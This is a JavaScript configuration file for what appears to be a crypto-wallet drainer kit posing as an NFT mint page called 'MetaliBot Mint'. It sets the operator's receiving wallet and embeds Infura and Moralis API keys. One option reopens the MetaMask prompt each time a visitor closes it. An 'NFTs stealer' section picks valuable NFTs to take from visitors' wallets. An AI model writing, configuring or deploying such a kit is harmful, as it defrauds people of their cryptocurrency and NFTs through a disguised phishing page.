const address = "0x6a8e971347f96d479654858b546b06aa44D5379D";    // Your wallet that you have to receive NFTs
const infuraId = "05d6284f81b94ef5adf29d858cb7b6b8"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "Qk1ZimVEDrcgc4LztyuUzZBmrafA4FuZMc8GIfDrRzDrzx9AMVusmAXeklKFKRu1"    // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "MetaliBot",
    title: "MetaliBot Mint", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "9/12/2022",
    socialMedia: {
        discord: "https://discord.gg",
        twitter: "https://twitter.com",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.01,         // Price per NFT.
    totalSupply: 888,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 5,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "0x6a8e971347f96d479654858b546b06aa44D5379D" // leave empty if you want to use the same address 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
